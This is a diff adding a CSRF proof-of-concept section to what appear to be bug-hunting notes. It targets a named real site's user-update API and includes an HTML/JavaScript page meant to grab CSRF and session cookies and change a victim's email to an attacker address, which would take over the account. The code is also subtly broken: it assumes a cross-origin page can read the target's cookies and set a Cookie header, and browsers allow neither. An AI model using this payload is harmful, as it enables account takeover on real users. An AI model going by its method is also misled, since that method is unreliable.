@@ -251,9 +251,98 @@ $newEmail = $_POST['newEmail'];
 ``` 
 a sample of poc of csrf that checks for refereal header 
 
+## CSRF Proof of Concept (PoC)
+### 1
+#### Objective
+
+Automate the process of extracting the CSRF token from a session cookie and using it in a PUT request to update user information.
+
+#### Target Request
+
+http
+`PUT /api/users/22352979?text_format=html,markdown HTTP/2 Host: genius.com`
+
+#### Headers
+
+- **Cookie:** (Include all relevant cookies)
+- **X-Csrf-Token:** (Extracted CSRF token)
+- **Content-Type:** `application/json;charset=UTF-8`
+
+#### Payload
+
+json
+
+Copy code
+
+`{     "user": {         "about_me": "",         "email": "3mira+12345@bugcrowdninja.com"     } }`
+
+#### Automated Process Overview
+
+1. **Extract Session Cookies:**
+    
+    - Use a script to retrieve session cookies from the target application.
+2. **Extract CSRF Token:**
+    
+    - Parse the cookies to locate the `_csrf_token`.
+3. **Prepare Request:**
+    
+    - Construct the PUT request with the extracted token in the `X-Csrf-Token` header.
+4. **Send Request:**
+    
+    - Execute the PUT request to update the user information.
+here is the code used 
+```html
+<html>
+  <body>
+    <h1>CSRF PoC</h1>
+    <p>This PoC captures the session and CSRF token from cookies and sends a malicious request.</p>
+    <script>
+      // Function to extract cookies by keyword search
+      function findCookieByNameKeyword(keyword) {
+        let cookieArr = document.cookie.split(";");
+        for (let i = 0; i < cookieArr.length; i++) {
+          let cookiePair = cookieArr[i].split("=");
+          if (cookiePair[0].trim().toLowerCase().includes(keyword.toLowerCase())) {
+            return decodeURIComponent(cookiePair[1]);
+          }
+        }
+        return null;
+      }
+
+      // Automatically find cookies that match 'csrf' and 'session'
+      var csrfToken = findCookieByNameKeyword("csrf"); // Find any cookie with 'csrf' in the name
+      var sessionCookie = findCookieByNameKeyword("session"); // Find any cookie with 'session' in the name
+
+      if (csrfToken && sessionCookie) {
+        // Create an XMLHttpRequest to send the attack with the captured CSRF token
+        var xhr = new XMLHttpRequest();
+        xhr.open("PUT", "https://genius.com/api/users/22352979?text_format=html,markdown", true);
+        xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+        xhr.setRequestHeader("X-Csrf-Token", csrfToken); // Set the captured CSRF token
+        xhr.setRequestHeader("Cookie", "user_credentials=" + sessionCookie); // Set the captured session cookie
+
+        // The payload, such as changing the victim's email or about me section
+        var data = JSON.stringify({
+          "user": {
+            "about_me": "",
+            "email": "attacker@malicious.com" // Replace this with your desired payload
+          }
+        });
+
+        xhr.send(data);
+        console.log("Malicious request sent!");
+      } else {
+        console.log("Failed to retrieve CSRF token or session cookie.");
+      }
+    </script>
+  </body>
+</html>
+```
 
 
 
+## tips
 tips 
 - may be checking for referrer header  [writeup ](https://flex0geek.blogspot.com/2019/04/critical-ibm-bypass-csrf-protection.html)
 - or origin 
